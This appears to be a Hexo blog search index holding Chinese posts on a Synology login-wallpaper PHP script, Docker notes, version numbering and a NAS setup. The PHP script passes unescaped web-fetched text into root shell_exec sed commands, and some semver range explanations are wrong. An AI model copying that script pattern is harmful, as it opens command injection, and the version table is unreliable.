<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NAS自动更换登录页背景</title>
      <link href="/post/nas-auto-change-bgimg/"/>
      <url>/post/nas-auto-change-bgimg/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8iauczkluj30pa0jw4ar.jpg" alt=""></p><a id="more"></a><p>群晖默认的登陆页实在是太单调了，之前看过很多抓取必应图片自动更换的例子，今天也想亲自实战一把应用在群晖登陆页上。于是 Google 到了这样一篇文章<a href="https://03k.org/dsm-bing.html" target="_blank" rel="noopener">巧用计划任务修改群晖登录壁纸</a>，这是一篇发布时间较久的文章，其中的一些信息可能已经失效，但其他地方的很多文章都是拷贝这里的，所以还是决定按图索骥试一试。</p><p>这个文章是用 shell 写的，但我觉得里边的功能用 PHP 也能实现（这怎么会难得住世界上最好的语言呢😜），通过必应首页控制台分析可知，从一个地址<code>https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;nc=1572500909531&amp;pid=hp&amp;FORM=BEHPTB&amp;video=1</code>获取图片 URI，返回完整结果如下。取的图片 URI 后再以 GET 方式获取图片内容。进一步分析可得，URL中的 <code>idx</code> 为 0 时表示返回当天图片，1 为前一天，以此类推，最大有效值为 8。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"images"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"startdate"</span>: <span class="string">"20191031"</span>,</span><br><span class="line">      <span class="attr">"fullstartdate"</span>: <span class="string">"201910311600"</span>,</span><br><span class="line">      <span class="attr">"enddate"</span>: <span class="string">"20191101"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"/th?id=OHR.AlbertaOwl_ZH-CN1184867720_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp"</span>,</span><br><span class="line">      <span class="attr">"urlbase"</span>: <span class="string">"/th?id=OHR.AlbertaOwl_ZH-CN1184867720"</span>,</span><br><span class="line">      <span class="attr">"copyright"</span>: <span class="string">"一只坐在白杨树上的大雕鸮，阿尔伯塔 (© Ambre Haller/Getty Images)"</span>,</span><br><span class="line">      <span class="attr">"copyrightlink"</span>: <span class="string">"/search?q=%e5%a4%a7%e9%9b%95%e9%b8%ae&amp;form=HPCAPT&amp;mkt=zh-cn"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"quiz"</span>: <span class="string">"/search?q=Bing+homepage+quiz&amp;filters=WQOskey:%22HPQuiz_20191031_AlbertaOwl%22&amp;FORM=HPQUIZ"</span>,</span><br><span class="line">      <span class="attr">"wp"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">"hsh"</span>: <span class="string">"a76d074e286a1dd8aa778815fe611e2e"</span>,</span><br><span class="line">      <span class="attr">"drk"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"top"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"bot"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"hs"</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"tooltips"</span>: &#123;</span><br><span class="line">    <span class="attr">"loading"</span>: <span class="string">"正在加载..."</span>,</span><br><span class="line">    <span class="attr">"previous"</span>: <span class="string">"上一个图像"</span>,</span><br><span class="line">    <span class="attr">"next"</span>: <span class="string">"下一个图像"</span>,</span><br><span class="line">    <span class="attr">"walle"</span>: <span class="string">"此图片不能下载用作壁纸。"</span>,</span><br><span class="line">    <span class="attr">"walls"</span>: <span class="string">"下载今日美图。仅限用作桌面壁纸。"</span>,</span><br><span class="line">    <span class="attr">"play"</span>: <span class="string">"播放视频"</span>,</span><br><span class="line">    <span class="attr">"pause"</span>: <span class="string">"暂停视频"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，我们要分析群晖是从何处读取的图片，从查到的文章可知，图片位于<code>/usr/syno/etc/login_background.jpg</code>和<code>/usr/syno/etc/login_background_hd.jpg</code>。所以我们要到终端一探究竟。首先，我们需要在控制面板的终端里开启 ssh 服务<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ia5v9rjqj30j80frwg5.jpg" alt=""></p><p>然后我们以命令<code>ssh username@hostname [-p port]</code>登陆 NAS，由于图片存储位置需要 root 权限，我们还需要用命令<code>sudo -i</code>切换到 root 用户。（如果需要在公网ssh登陆，只需要在路由器上将 NAS 的 ssh 端口转发即可）</p><blockquote><p>小插曲：当我配置了.ssh/config 想要 ssh 免密登陆时，发现 NAS 仍然每次要求密码，使得我一度以为是配置有误，直到我重新给桌角吃灰的树莓派通电，才发现确实是 NAS 系统的问题，最后找到了这样一篇文章<a href="https://soulteary.com/2018/07/20/synology-passwordless-ssh.html" target="_blank" rel="noopener">设置群晖 6.1 以及 6.2 使用证书免密登录</a>，在按照文章重启 sshd 服务尝试修复时，发现 sshd 服务起不来了😅，最后终于在控制面板 ==&gt; 信息中心 ==&gt; 服务 中重新启动服务。嗯，我觉得我还能忍，也就每次登陆的时候多花两秒钟嘛，强迫症要适时低头</p></blockquote><p>当我进入系统后，发现<code>/usr/syno/etc/</code>下并没有<code>login_background*.jpg</code>的文件，然后在控制面板的主题中修改登录页图片，并用<code>ll -t</code>命令观察该目录下的变化，发现出现了这两个文件，时间也是刚刚操作的时间，因此可以判定确实读取该位置的文件。<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iaccklxcj30oq0fujuy.jpg" alt=""></p><p>接下来，我们通过代码直接获取图片内容及介绍信息，填充登陆页。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 获取图片信息</span></span><br><span class="line">$img_info = file_get_contents(<span class="string">'https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;pid=hp&amp;FORM=BEHPTB&amp;video=1'</span>);</span><br><span class="line">$img_obj = json_decode($img_info)-&gt;images[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取图片地址</span></span><br><span class="line">$img_url = <span class="string">'https://cn.bing.com'</span> . $img_obj-&gt;url;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取图片名</span></span><br><span class="line">$url_params = parse_url($img_url)[<span class="string">'query'</span>];</span><br><span class="line">parse_str($url_params, $result);</span><br><span class="line">$filename = $result[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下载图片并保存</span></span><br><span class="line"><span class="comment">// 注意文件路径写为绝对路径，避免出错</span></span><br><span class="line">$img_rsc = file_get_contents($img_url);</span><br><span class="line">file_put_contents(<span class="string">'/var/services/homes/palemoky/work/bing_wallpaper/'</span> . $filename, $img_rsc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将图片复制到目标位置</span></span><br><span class="line">copy(<span class="string">'/var/services/homes/palemoky/work/bing_wallpaper/'</span> . $filename, <span class="string">'/usr/syno/etc/login_background.jpg'</span>);</span><br><span class="line">copy(<span class="string">'/var/services/homes/palemoky/work/bing_wallpaper/'</span> . $filename, <span class="string">'/usr/syno/etc/login_background_hd.jpg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取图片描述信息</span></span><br><span class="line"><span class="keyword">list</span>($msg, $title) = explode(<span class="string">'('</span>, rtrim($img_obj-&gt;copyright, <span class="string">')'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改欢迎信息</span></span><br><span class="line">shell_exec(<span class="string">'sed -i "/login_welcome_title/c login_welcome_title=\"'</span> . $title . <span class="string">'\"" /etc/synoinfo.conf'</span>);</span><br><span class="line">shell_exec(<span class="string">'sed -i "/login_welcome_msg/c login_welcome_msg=\"'</span> . $msg . <span class="string">'\"" /etc/synoinfo.conf'</span>);</span><br></pre></td></tr></table></figure><blockquote><p>小插曲：这里我们需要修改系统配置文件<code>/etc/synoinfo.conf</code>，我查询到的 php 修改文件方式都是把整个文件读取出来，然后再把修改后的文件赋值给变量，最后再覆写原来的文件，这种方式不太优雅，我修改一个字符都要读取全部的文件并回写，因此选择使用了 sed 来操作。sed 相同的命令在 Mac 下执行就会报 <code>sed: 1: &quot;synoinfo.conf&quot;: unterminated substitute pattern</code> 的错误，但 Linux 下就完全正常，Unix 和 Linux 系统间还是要注意这些微小的差别，害得我调了半天。</p></blockquote><p>把以上代码保存为文件，由于背景图文件是 root 用户，因此需要使用 root 用户执行<code>php .../bing_wallpaper.php</code>，如果发现在目标位置产生了最新的背景图文件，并在主题设置页生效，则说明代码工作正常。<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ibjcc27vj30mv0ewq66.jpg" alt=""></p><p>接下来就是创建计划任务了，离成功只有一步了<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iaflytkuj30km0fjta6.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iai54gl0j30ep06274e.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iaikc1syj30en0epgm6.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iaj7rwt4j30eq09cdgg.jpg" alt=""></p><p>至此，大功告成，来看下效果图。emmmm, not bad.<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ias6kh5dj30vc0mcu0n.jpg" alt=""></p><p>最后，如果你觉得左上角的信息有些无趣，也可以用<a href="https://github.com/chinese-poetry/chinese-poetry" target="_blank" rel="noopener">chinese-poetry</a>每天自动更换古诗词，或者抓取 <a href="http://wufazhuce.com/one/2618" target="_blank" rel="noopener">One·一个</a>的每日一句替换，还可以抓包分析豆瓣的 iOS 每日电影 widget，获取电影台词……更多玩法等待解锁。</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker 学习笔记</title>
      <link href="/post/docker-notes/"/>
      <url>/post/docker-notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8g071xly2j30xc0kf77g.jpg" alt=""></p><a id="more"></a><p>请不要使用<code>docker commit</code>命令来定制镜像，因为你可能只在容器中修改了很少的内容，但其他相关的很多内容也都随之修改了，一旦执行<code>docker commit</code>生成镜像，则该镜像中的内容将无法再修改，<code>docker commit</code>适用于入侵后保护现场等一些特殊场景，定制镜像请使用<code>Dockerfile</code>。</p><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><table><thead><tr><th>指令</th><th>形式</th><th>说明</th><th>备注</th></tr></thead><tbody><tr><td><code>FROM</code></td><td><code>FROM &lt;image&gt; [AS &lt;name&gt;]</code></td><td></td><td></td></tr><tr><td></td><td><code>FROM &lt;image&gt;[:&lt;tag&gt;] [AS &lt;name&gt;]</code></td><td></td><td></td></tr><tr><td></td><td><code>FROM &lt;image&gt;[@&lt;digest&gt;] [AS &lt;name&gt;]</code></td><td></td><td></td></tr><tr><td><code>RUN</code></td><td><code>RUN &lt;command&gt;</code></td><td>以shell 形式运行，Linux 默认为<code>/bin/sh -c</code>，Windows 默认为<code>/S /C</code>。如果不是以<code>/bin/sh</code>运行，则使用<code>RUN [&quot;/bin/bash&quot;, &quot;-C&quot;, &quot;echo hello&quot;]</code>形式</td><td><code>RUN</code>命令在构建镜像期间会执行命令并提交结果，而<code>CMD</code>则不会在构建期间执行任何动作，除非你在构建期间指定了明确的操作（？？？如果没有指定，CMD 当然不会执行任何动作，如果指定了但却没有执行，这不是 bug 吗？这不是一句废话吗？所以二者的区别是什么？附上官方文档原文：Don’t confuse RUN with CMD. RUN actually runs a command and commits the result; CMD does not execute anything at build time, but specifies the intended command for the image.）</td></tr><tr><td></td><td><code>RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</code></td><td>exec 形式。该形式会被解析为 JSON 格式。需要注意的是，exec 形式不会像 shell 形式调用 shell 命令，这意味着正常的 shell 命令不会被执行。如<code>RUN [ &quot;echo&quot;, &quot;$HOME&quot; ]</code>并不会将<code>$HOME</code>替换为变量。如果你想要处理 shell，则需要使用 shell 形式或者直接执行 shell，例如<code>RUN [ &quot;sh&quot;, &quot;-c&quot;, &quot;echo $HOME&quot; ]</code></td><td></td></tr><tr><td><code>CMD</code></td><td><code>CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</code></td><td>exec 形式, 推荐方式。<br>通<code>RUN</code>命令类似，该形式<code>CMD [ &quot;echo&quot;, &quot;$HOME&quot; ]</code>不会解析<code>$HOME</code>变量，若需解析则使用 shell 形式<code>CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;echo $HOME&quot; ]</code></td><td>一个<code>Dockerfile</code>中只能有一个<code>CMD</code>命令，如果有多个，仅最后一个生效。</td></tr><tr><td></td><td><code>CMD [&quot;param1&quot;,&quot;param2&quot;]</code></td><td>作为ENTRYPOINT的默认参数</td><td>如果<code>CMD</code>被用于做<code>ENTRYPOINT</code>的默认参数，则<code>CMD</code>与<code>ENTRYPOINT</code>均需被设定为 JSON 格式</td></tr><tr><td></td><td><code>CMD command param1 param2</code></td><td>shell 形式</td><td>如果用户在<code>docker run</code>时指定了参数，则会覆盖<code>CMD</code>中的参数</td></tr><tr><td><code>LABEL</code></td><td><code>LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</code><br><br><code>LABEL maintainer=&quot;username@example.com&quot;</code></td><td></td><td><code>LABEL</code>可以读取父级镜像中的值，如果父级与子级存在相同的 LABEL 值，则子级会覆盖父级中的值</td></tr></tbody></table><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="https://docs.docker.com/engine/reference/builder/" target="_blank" rel="noopener">Dockerfile reference</a></li><li><a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/" target="_blank" rel="noopener">Best practices for writing Dockerfiles</a></li><li><a href="https://www.jianshu.com/p/f0a0f6a43907" target="_blank" rel="noopener">Dockerfile RUN，CMD，ENTRYPOINT 命令区别</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>软件版本号规范及命名</title>
      <link href="/post/software-version-rule/"/>
      <url>/post/software-version-rule/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8e1gpfct1j31hc0u0jtr.jpg" alt=""></p><p><code>package.json</code>中的版本号都是什么含义呢？</p><a id="more"></a><h2 id="版本号格式"><a href="#版本号格式" class="headerlink" title="版本号格式"></a>版本号格式</h2><p>我们通常使用的是<code>X.Y.Z</code>格式的版本号，它们分别表示主、次、修正版本号。</p><h2 id="版本号的演进"><a href="#版本号的演进" class="headerlink" title="版本号的演进"></a>版本号的演进</h2><table><thead><tr><th align="center">版本号</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">0.1.0</td><td align="left">开发版第一次发布</td></tr><tr><td align="center">0.1.1</td><td align="left">第一次发布修正版</td></tr><tr><td align="center">0.2.0</td><td align="left">开发版重大更新</td></tr><tr><td align="center">1.0.0</td><td align="left">稳定版第一次发布</td></tr><tr><td align="center">1.0.1</td><td align="left">第一次稳定版修正</td></tr><tr><td align="center">1.0.2</td><td align="left">第二次稳定版修正</td></tr><tr><td align="center">1.1.0</td><td align="left">稳定版新功能推出</td></tr><tr><td align="center">2.0.0</td><td align="left">稳定版重大更新</td></tr></tbody></table><h2 id="版本符号说明"><a href="#版本符号说明" class="headerlink" title="版本符号说明"></a>版本符号说明</h2><table><thead><tr><th>版本号符号</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>精确匹配</td><td><code>1.2.3</code></td><td><code>1.2.3</code></td></tr><tr><td>星号</td><td><code>1.0.*</code></td><td><code>&gt;=1.0</code>且<code>&lt;1.1</code></td></tr><tr><td>连字符</td><td><code>1.0-2.0</code></td><td><code>&gt;=1.0.0</code>且<code>&lt;2.1</code></td></tr><tr><td>波浪线</td><td><code>~1.2</code></td><td><code>&gt;=1.2</code>且<code>&lt;2.0</code></td></tr><tr><td>脱字符</td><td><code>^1.2.3</code><br><code>^0.3</code></td><td><code>&gt;=1.2.3</code>且<code>&lt;2.0</code><br><code>&gt;=0.3.0</code>且<code>&lt;0.4.0</code></td></tr><tr><td>版本标识</td><td><code>@stable</code><br><code>@dev</code></td><td><code>dev &gt; alpha &gt; beta &gt; RC &gt; stable</code><br>预设抓取stable，但可用@指定</td></tr></tbody></table><h2 id="Alpha、Beta、RC、GA-版本的区别"><a href="#Alpha、Beta、RC、GA-版本的区别" class="headerlink" title="Alpha、Beta、RC、GA 版本的区别"></a>Alpha、Beta、RC、GA 版本的区别</h2><p>Alpha：是内部测试版，一般不向外部发布，会有很多Bug。一般只有测试人员使用。</p><p>Beta：也是测试版，这个阶段的版本会一直加入新的功能。在Alpha版之后推出。</p><p>RC：(Release　Candidate) 顾名思义么 ! 用在软件上就是候选版本。系统平台上就是发行候选版本。RC 版不会再加入新的功能了，主要着重于除错。</p><p>GA:General Availability，正式发布的版本，在国外都是用 GA 来说明release版本的。</p><p>RTM：(Release to Manufacture)是给工厂大量压片的版本，内容跟正式版是一样的，不过 RTM 版也有出限制、评估版的。但是和正式版本的主要程序代码都是一样的。</p><p>OEM：是给计算机厂商随着计算机贩卖的，也就是随机版。只能随机器出货，不能零售。只能全新安装，不能从旧有操作系统升级。包装不像零售版精美，通常只有一面CD和说明书(授权书)。</p><p>RVL：号称是正式版，其实RVL根本不是版本的名称。它是中文版/英文版文档破解出来的。</p><p>EVAL：而流通在网络上的EVAL版，与“评估版”类似，功能上和零售版没有区别。</p><p>RTL：Retail(零售版)是真正的正式版，正式上架零售版。在安装盘的i386文件夹里有一个eula.txt，最后有一行EULAID，就是你的版本。比如简体中文正式版是EULAID:WX.4_PRO_RTL_CN，繁体中文正式版是WX.4_PRO_RTL_TW。其中：如果是WX.开头是正式版，WB.开头是测试版。_PRE，代表家庭版；_PRO，代表专业版。</p><p>α、β、λ常用来表示软件测试过程中的三个阶段，α是第一阶段，一般只供内部测试使用；β是第二个阶段，已经消除了软件中大部分的不完善之处，但仍有可能还存在缺陷和漏洞，一般只提供给特定的用户群来测试使用；λ是第三个阶段，此时产品已经相当成熟，只需在个别地方再做进一步的优化处理即可上市发行。</p><hr><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="http://semver.org/lang/zh-CN/" target="_blank" rel="noopener">语义化版本 2.0.0</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 版本号 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NAS 私有云搭建记</title>
      <link href="/post/nas/"/>
      <url>/post/nas/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8ckrzioopj31400u0x6p.jpg" alt=""></p><p>再也不用担心网盘倒闭限速了😎</p><a id="more"></a><p>之前家里的路由器虽然有文件共享及管理功能，但挂载磁盘是 NTFS 的，Mac 很难管理这种格式，创建修改文件夹什么的也非常不方便，在 10.24 晚终于感觉难以忍受，看到京东群晖 DS218+ 正好是最低价，纠结半天后还是剁手了。京东快递很快，晚上下单，第二天早上就收到货了。周五晚上下班后就迫不及待回家开始折腾。</p><p>DS218+ 有两个盘位，最大支持 20TB，内置 2G 内存，但可以扩展到 6GB，支持 4K 解码。但硬盘是需要单独购买的，我之前正好在美亚海淘了一个 10TB 的西数硬盘，查询了一些资料后，发现可以将该硬盘盒拆掉取出硬盘，这正是我想要的。于是我要把拆解后的硬盘插入群晖。</p><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cksf1t0hj31400u0e82.jpg" alt=""></p><p>在 B 站看了个拆解教程后，大概了解一点内部结构，于是照猫画虎，用银行卡拆了一会儿就打开了。拆完后发现有一个卡扣还是折了😅</p><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cktlhsomj31400u0x6p.jpg" alt=""></p><p>于是插入群晖准备开始体验一下，安装系统提示我要格式化？但是硬盘已经存储了 2T 的资源，很多都是 4K 的，我手里还有块 1T 的硬盘，但很多资源也得丢掉了，一部剧 500+G，实在是放不下，拷贝还要花很长时间。即便丢弃了很多资源，最后拷贝完也到了凌晨 1 点半，最后终于在 2 点钟成功完成安装。</p><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cl8q958kj30u01404qq.jpg" alt=""></p><p>群晖的功能还是非常丰富的，应用中心包括 docker、PHP、Python、Tomcat、Apache、Java、MariaDB、WordPress、下载工具、视频播放器、音频播放器、照片管理、文档编辑……不仅可以作为一台小型服务器，还可以随时随地查看硬盘储存的资料，也可以将手机或者电脑的资料随时随地保存到 NAS 中。由于之前的路由器已经做了 DDNS，所以 NAS 我只需要在原来的域名上加上对应的端口号就可以在外网访问了，非常的方便。</p><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8clehlcuyj31400u0atx.jpg" alt=""></p><p>由于我只有一块硬盘，所以如果硬盘挂了的话，这块硬盘上的所有数据就都丢失了，但群晖可以用多块硬盘组成 RAID，通过冗余的方式来保障数据的安全性，考虑到现在的硬盘空间已经足够，还是以后再说另一块硬盘的事吧。</p><p>对于家里的小米电视来说，之前从路由器读取 4K 视频总是会不时卡顿，现在完全就像本地读取一样，非常流畅。</p><p>btkitty 也挂了，那些宝贵的资源可能再也找不回来了，心痛。</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《深入理解计算机系统》</title>
      <link href="/post/a-programmer&#39;s-perspective/"/>
      <url>/post/a-programmer&#39;s-perspective/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g87c9ywdudj31hb0u0he4.jpg" alt=""></p><blockquote><p>人生就是一场战争，要随时做好战斗准备。</p></blockquote><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>玩转 HTTPS</title>
      <link href="/post/https-illustrated/"/>
      <url>/post/https-illustrated/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87bjl942qj30pg0dwgn0.jpg" alt=""></p><blockquote><p>理解一个问题与讲明白一个问题哪个更困难？</p></blockquote><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《代码大全》</title>
      <link href="/post/code-completed/"/>
      <url>/post/code-completed/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87bbp4fgij30uk0fa0vg.jpg" alt=""></p><blockquote><p>大道至简，少即是多。</p></blockquote><a id="more"></a><h2 id="第1章-欢迎进入软件构建的世界"><a href="#第1章-欢迎进入软件构建的世界" class="headerlink" title="第1章 欢迎进入软件构建的世界"></a>第1章 欢迎进入软件构建的世界</h2><p>（略）</p><h2 id="第2章-用隐喻来更充分地理解软件开发"><a href="#第2章-用隐喻来更充分地理解软件开发" class="headerlink" title="第2章 用隐喻来更充分地理解软件开发"></a>第2章 用隐喻来更充分地理解软件开发</h2><p>精心计划，并不意味着事无巨细的计划或者过的计划。你可以把房屋的结构性的支撑规划清楚，而在日后再决定是用木地板还是地毯，地面漆成什么颜色，屋顶使用什么材料，等等。</p><p><font color='red'><strong>项目的成败很大程度上在构建活动的开始之前就已经注定了。</strong></font></p><h2 id="第3章-三思而后行：前期准备"><a href="#第3章-三思而后行：前期准备" class="headerlink" title="第3章 三思而后行：前期准备"></a>第3章 三思而后行：前期准备</h2><blockquote><p> 本章内容针对架构师。</p></blockquote><p>错误越早引入软件当中，问题就会越复杂，修正这个错误的代价也就越高，因为错误会牵涉到系统的更多部分。</p><p>程序员是软件食物链的最后一环，架构师吃掉需求，设计师吃掉架构，而程序员则消化设计。</p><p>在软件开发中，如果需求被污染了，那么它就会污染架构，而架构又会污染构建。这样就会导致程序员脾气暴躁，营养失调；开发出的软件具有放射性污染，而且周身都是缺陷。</p><p>在一开始就把事情做好是最合算的。进行非必要的改动的代价是高昂的。<strong>在软件开发过程的上游引入的缺陷通常比那些在下游引入的缺陷具有更广泛的影响力。</strong>这也使得早期的缺陷代价更加高昂。</p><p>如果你不能向一个六岁小孩解释某件事，那么你自己就没有真正理解它。——爱因斯坦</p><p>架构的典型组成部分：</p><ul><li>程序组织</li><li>主要的类</li><li>数据设计</li><li>业务规则</li><li>用户界面设计</li><li>资源管理</li><li>安全性</li><li>性能</li><li>可伸缩性</li><li>互用性</li><li>国际化/本地化</li><li>输入/输出</li><li>错误处理</li><li>容错性</li><li>架构的可行性</li><li>过度工程</li><li>关于“买”还是“造”的决策</li><li>关于复用的决策</li><li>变更策略</li><li>架构的总体质量<ul><li>架构的目标应该清楚的表述</li><li>优秀的软件架构很大程度上是与机器和编程语言无关的</li><li>架构应该踩在对系统“欠描述”和“过度描述”之间的分界线上</li><li>架构应该明确地指出有风险的区域</li><li>架构应该包含多个视角</li><li>最后，你不应该担忧架构的任何部分。<strong>架构不应该包含任何仅仅为了取悦老板的东西</strong>。它不应该包含任何对你而言很难理解的东西。你就是那个实现架构的人，如果你自己都弄不懂，那又怎么实现呢？</li></ul></li></ul><p><em>在软件中，链条的强度不是取决于最薄弱的一环，而是等于所有薄弱环节的乘积。</em></p><p><em>构建活动的准备工作的根本目标在于降低风险。要确认你的准备活动是在降低风险，而非增加风险。</em></p><p>如果你想开发高质量的软件，软件开发过程中必须由始至终关注质量。在项目初期关注质量，对产品质量的正面影响比在项目末期关注质量的影响要大。</p><blockquote><p>优秀的架构不是用更多的东西，而是用更少、更简单的东西来支撑系统。</p></blockquote><h2 id="第4章-关键的“构建”决策"><a href="#第4章-关键的“构建”决策" class="headerlink" title="第4章 关键的“构建”决策"></a>第4章 关键的“构建”决策</h2><blockquote><p>本章内容针对程序员或技术带头人。</p></blockquote><p>本章概述：</p><ul><li>选择编程语言</li><li>编程约定<ul><li>成功编程的关键就在于避免随意的变化，这样你的大脑就可以专注于那些真正需要的变化。</li></ul></li><li>你在技术浪潮中的位置<ul><li>新兴编程语言会让你花很多时间来搞明白它是如何运作的，以及解决很多语言缺陷；成熟的语言则可以用大部分时间稳定持续地编写新功能。</li></ul></li><li>选择主要的构建实践方法</li></ul><p>主要的构建实践：</p><ul><li>编码<ul><li>你有没有确定有多少设计工作需要预先进行，多少工作通过编码完成？</li><li>有没有规定诸如名称、注释、代码格式等“编码约定”？</li><li>有没有规定特定的由软件架构确定的编码实践？如怎样处理错误条件、如何处理安全性事项、对于类接口有哪些约定、可重用的代码遵循哪些标准、在编码时考虑多少性能因素等？</li><li>有没有找到自己在技术浪潮中的位置，并相应调整自己的措施？如果必要，你是否知道如何“深入一种语言去编程”，而不受限于语言？</li></ul></li><li>团队工作<ul><li>有没有定义一套集成工具？即，你有没有定义一套工作流，规定程序员在把代码 check in 到 master 之前，必须完成这些步骤？</li><li>程序员是结对编程还是独自编程？或者是这二者的某种组合？</li></ul></li><li>质量保证<ul><li>程序员在编写代码之前，是否先为之编写测试用例？</li><li>程序员会为自己的代码写单元测试吗？</li><li>程序员在 check in 代码前，会用调试器单步跟踪整个代码流程吗？</li><li>程序员在 check in 代码前，是否进行集成测试？</li><li>程序员会 review 或检查别人的代码吗？</li></ul></li><li>工具<ul><li>你是否选用了某种版本控制工具？</li><li>你是否选定了一种语言，以及语言的版本或编译器版本？</li><li>你是否选定了某个编程框架，或者明确地决定不使用编程框架？</li><li>你是否决定允许使用非标准的语言特性？</li><li>你是否选定并拥有了其他将用到的工具——编辑器、重构工具、调试器、测试框架、语法检查等。</li></ul></li></ul><p>不同的编程语言只是不同的表达方式。</p><h2 id="第5章-软件构架中的设计"><a href="#第5章-软件构架中的设计" class="headerlink" title="第5章 软件构架中的设计"></a>第5章 